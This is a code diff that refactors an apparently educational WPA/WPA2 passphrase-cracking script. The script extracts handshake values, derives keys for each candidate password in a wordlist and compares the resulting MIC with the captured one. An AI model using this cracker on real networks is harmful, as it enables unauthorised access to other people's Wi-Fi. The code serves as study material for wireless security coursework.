@@ -1,42 +1,15 @@
-import sys
-from scapy.all import *
-from binascii import a2b_hex, b2a_hex
-
-from wpa_key_derivation import extract_info_from_packet
-# from pbkdf2 import pbkdf2_hex
 from pbkdf2 import *
-from numpy import array_split
-from numpy import array
-import hmac, hashlib
+from wpa_key_derivation import extract_info_from_packet, customPRF512
 
 
-def customPRF512(key, A, B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i = 0
-    R = b''
-    while i <= ((blen * 8 + 159) / 160):
-        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
-        i += 1
-        R = R + hmacsha1.digest()
-    return R[:blen]
-
-
-def compute_mic(passPhrase):
-
+def compute_mic(passPhrase, ssid, APmac, Clientmac, ANonce, SNonce, data):
+    """Computes a MIC from a passphrase and the data from a handshake"""
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
     A = "Pairwise key expansion"  # this string is used in the pseudo-random function
 
-    ssid, APmac, Clientmac, ANonce, SNonce, _, eapol, data = extract_info_from_packet()
-
     B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                                   SNonce)  # used in pseudo-random function
-
-    data = a2b_hex(
-        "0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
 
     # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase = str.encode(passPhrase)
@@ -59,11 +32,13 @@ if __name__ == "__main__":
     with open(filename, "r") as f:
         passwords = f.readlines()
 
-    _, _, _, _, _, mic_to_test, _, _ = extract_info_from_packet()
 
+    ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, eapol, data = extract_info_from_packet()
+
+    # For each password candidate, we compute the MIC and compare it to the one from the handshake
     for password in passwords:
         password = password.strip()
         print("Testing password: {}".format(password))
-        if compute_mic(password) == mic_to_test:
+        if compute_mic(password, ssid, APmac, Clientmac, ANonce, SNonce, data) == mic_to_test:
             print("Password found: {}".format(password))
             break
